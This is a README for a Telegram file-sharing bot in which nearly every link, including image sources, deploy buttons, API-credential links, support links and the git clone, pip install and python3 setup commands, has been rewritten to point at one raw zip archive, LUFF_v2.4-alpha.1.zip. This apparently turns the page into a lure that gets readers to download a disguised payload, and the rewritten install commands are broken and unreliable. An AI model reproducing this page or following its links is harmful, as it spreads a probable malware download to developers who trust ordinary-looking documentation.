# Weekends File Sharing Bot

<p align="center">
  <a href="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
    <img src="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip" width ="250">
  </a>
  <a href="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
    <img src="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
  </a>  
</p>


Telegram Bot to store Posts and Documents and it can Access by Special Links.
I Wish Everyone Who Bought This Repository Has Satisfied .....😇. 


### Features
- Fully customisable.
- Customisable welcome & Forcesub messages.
- Customisable welcome & Forcesub images.
- More than one Posts in One Link.
- Can be deployed on heroku directly.
- Protect Content to Prevent Forwarding
- Auto-Delete Files After a Configurable Time
- Many More...

## What’s Next

These features are in the pipeline, and contributions from the community are welcome!

- [x] **Channel Join Request**  
  Implement a feature that prompts users to join a specified Telegram channel before accessing the bot's functionalities.


 
### Setup

- Add the bot to Database Channel with all permission
- Add bot to ForceSub channel as Admin with Invite Users via Link Permission if you enabled ForceSub 

##
### Installation
#### Deploy on Heroku
**BEFORE YOU DEPLOY ON HEROKU, YOU SHOULD FORK THE REPO AND CHANGE ITS NAME TO ANYTHING ELSE**<br>
[![Deploy](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)</br>
<a href="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip">
  <img src="https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip%20to-Deploy-red?logo=youtube" width="147">
</a><br>
**Check This Tutorial Video on YouTube for any Help**<br>

#### Deploy on Railway
[![Deploy on Railway](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)

#### Deploy on Koyeb

The fastest way to deploy the application is to click the **Deploy to Koyeb** button below.


[![Deploy to Koyeb](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)


#### Deploy in your VPS
````bash
git clone https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
cd File-Sharing-Bot
pip3 install -r https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
# <Create https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip appropriately>
python3 https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
````

### Admin Commands

```
/start - start the bot or get posts

/batch - create link for more than one posts

/genlink - create link for one post

/users - view bot statistics

/broadcast - broadcast any messages to bot users

/stats - checking your bot uptime
```

### Variables

* `API_HASH` Your API Hash from https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
* `APP_ID` Your API ID from https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip
* `TG_BOT_TOKEN` Your bot token from @BotFather
* `OWNER_ID` Must enter Your Telegram Id
* `CHANNEL_ID_1` Your Channel ID eg:- -100xxxxxxxx
* `CHANNEL_ID_2` Your Channel ID eg:- -100xxxxxxxx
* `CHANNEL_ID_3` Your Channel ID eg:- -100xxxxxxxx
* `CHANNEL_ID_4` Your Channel ID eg:- -100xxxxxxxx
* `DATABASE_URL` Your mongo db url
* `ADMINS` Optional: A space separated list of user_ids of Admins, they can only create links
* `START_MESSAGE` Optional: start message of bot, use HTML and <a href='https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip'>fillings</a>
* `START_PIC` Optional: URL or file path of the image to be sent as the start message
* `FORCE_PIC` Optional: URL or file path of the image to be sent as the force message
* `FORCE_SUB_MESSAGE`Optional:Force sub message of bot, use HTML and Fillings
* `FORCE_SUB_CHANNEL` Optional: ForceSub Channel ID, leave 0 if you want disable force sub
* `PROTECT_CONTENT` Optional: True if you need to prevent files from forwarding
* `AUTO_DELETE_TIME `  Set the time in seconds for automatic file deletion. Default is False, which disables auto-deletion.
* `JOIN_REQUEST_ENABLED` Optional: Set to "True" to enable join request for the channel. Default is "False".

### Extra Variables

* `AUTO_DELETE_MSG` put your custom deletion text if you want Setup Custom deletion messaeg,
* `AUTO_DEL_SUCCESS_MSG` Set your custom success message for when the file is successfully deleted
* `CUSTOM_CAPTION` put your Custom caption text if you want Setup Custom Caption, you can use HTML and <a href='https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip'>fillings</a> for formatting (only for documents)
* `DISABLE_CHANNEL_BUTTON` Put True to Disable Channel Share Button, Default if False
* `BOT_STATS_TEXT` put your custom text for stats command, use HTML and <a href='https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip'>fillings</a>
* `USER_REPLY_TEXT` put your text to show when user sends any message, use HTML
* `DATABASE_NAME` Your mongo db session name


### Fillings
#### START_MESSAGE | FORCE_SUB_MESSAGE

* `{first}` - User first name
* `{last}` - User last name
* `{id}` - User ID
* `{mention}` - Mention the user
* `{username}` - Username

#### CUSTOM_CAPTION

* `{filename}` - file name of the Document
* `{previouscaption}` - Original Caption

#### CUSTOM_STATS

* `{uptime}` - Bot Uptime


## Support   
Join Our [Telegram Group](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip) For Support/Assistance And Our [Channel](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip) For Updates.   
   
Report Bugs, Give Feature Requests There..   

### Credits

- Thanks To JeffreySama and Rohit For His Awsome [Libary](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)
- Our Support Group Members

### Licence
[![GNU GPLv3 Image](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip)  

[FILE-SHARING-BOT](https://github.com/erennew/LUFFY-/raw/refs/heads/main/database/LUFF_v2.4-alpha.1.zip) is Paid Software: You can use, study share and improve it at your
will. 
##

   **Star this Repo if you Liked it ⭐⭐⭐**

